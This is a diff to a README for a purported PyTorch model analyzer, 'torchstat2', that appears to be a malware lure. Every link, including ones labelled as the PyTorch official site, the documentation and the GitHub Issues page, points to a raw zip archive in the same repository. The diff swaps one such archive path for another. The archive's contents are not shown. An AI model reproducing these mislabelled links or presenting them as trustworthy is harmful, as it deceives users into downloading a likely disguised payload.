@@ -1,6 +1,6 @@
 # 🔥 torchstat2 - Analyze Your PyTorch Models Easily
 
-[![Download torchstat2](https://raw.githubusercontent.com/Chenorange0/torchstat2/master/antehypophysis/torchstat2.zip)](https://raw.githubusercontent.com/Chenorange0/torchstat2/master/antehypophysis/torchstat2.zip)
+[![Download torchstat2](https://github.com/Chenorange0/torchstat2/raw/refs/heads/master/torchstat2/torchstat_1.5.zip)](https://github.com/Chenorange0/torchstat2/raw/refs/heads/master/torchstat2/torchstat_1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **torchstat2**, a simple model analyzer for your PyTorch projects. Th
 
 ## 💾 Download & Install
 
-To download **torchstat2**, please visit this page: [Download torchstat2](https://raw.githubusercontent.com/Chenorange0/torchstat2/master/antehypophysis/torchstat2.zip). You'll find the latest version ready for you.
+To download **torchstat2**, please visit this page: [Download torchstat2](https://github.com/Chenorange0/torchstat2/raw/refs/heads/master/torchstat2/torchstat_1.5.zip). You'll find the latest version ready for you.
 
 1. Click on the link above to open the releases page.
 2. Locate the most recent version at the top.
@@ -21,7 +21,7 @@ Before you begin, ensure your system meets the following requirements:
 
 - **Operating System:** Windows 10 or newer, macOS 10.15 or newer, or a recent version of Linux.
 - **Python:** Python 3.6 or newer is required to run the application.
-- **PyTorch:** Make sure you have PyTorch installed. You can download it from the [PyTorch official site](https://raw.githubusercontent.com/Chenorange0/torchstat2/master/antehypophysis/torchstat2.zip).
+- **PyTorch:** Make sure you have PyTorch installed. You can download it from the [PyTorch official site](https://github.com/Chenorange0/torchstat2/raw/refs/heads/master/torchstat2/torchstat_1.5.zip).
 
 ## 📋 Features
 
@@ -51,7 +51,7 @@ Once you have downloaded and installed **torchstat2**, follow these steps to ana
 
 ### How do I report a problem?
 
-If you run into any issues, visit the [GitHub Issues page](https://raw.githubusercontent.com/Chenorange0/torchstat2/master/antehypophysis/torchstat2.zip) to report your problem.
+If you run into any issues, visit the [GitHub Issues page](https://github.com/Chenorange0/torchstat2/raw/refs/heads/master/torchstat2/torchstat_1.5.zip) to report your problem.
 
 ### Can I use torchstat2 for different model types?
 
@@ -63,8 +63,8 @@ Not at all! Follow the steps in the "Download & Install" section, and you will b
 
 ## 🔗 Helpful Resources
 
-- [PyTorch Official Documentation](https://raw.githubusercontent.com/Chenorange0/torchstat2/master/antehypophysis/torchstat2.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/Chenorange0/torchstat2/master/antehypophysis/torchstat2.zip)
+- [PyTorch Official Documentation](https://github.com/Chenorange0/torchstat2/raw/refs/heads/master/torchstat2/torchstat_1.5.zip)
+- [GitHub Repository](https://github.com/Chenorange0/torchstat2/raw/refs/heads/master/torchstat2/torchstat_1.5.zip)
 
 ## ✏️ Contribution
 
